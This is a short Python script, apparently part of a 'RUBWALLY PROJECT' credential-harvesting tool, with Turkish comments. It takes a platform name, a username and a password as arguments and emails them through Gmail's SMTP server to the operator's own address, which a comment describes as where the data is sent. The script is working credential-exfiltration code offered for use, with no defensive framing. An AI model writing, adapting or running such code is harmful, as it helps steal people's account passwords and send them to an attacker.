import sys
import smtplib

platform = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]


def sendMail(to="", sub="", content=""):
    if (to == "" and content == "" and sub == ""):
        to = input("SEND TO >> ")
        sub = input("SUBJECT >> ")
        content = input("CONTENT >> ")
    mail = smtplib.SMTP("smtp.gmail.com", 587)
    mail.ehlo()
    mail.starttls()
    mail.login("<email>","<password>") # uygulama icin kullanacaginiz email-sifre
    content = 'Subject: {}\n\n{}'.format(sub, content)
    mail.sendmail("<your_email>", to, content) # verilerin gonderilecegi e-mail adresi (kendi e-mailiniz olabilir)
    print("mail gonderildi.")


content = "Platform : "+platform+"\n\nKullanici adi : "+username+"\nSifre : "+password
subject = "THE RUBWALLY PROJECT"

sendMail("<your_email>",subject,content)

#print(mail,password)

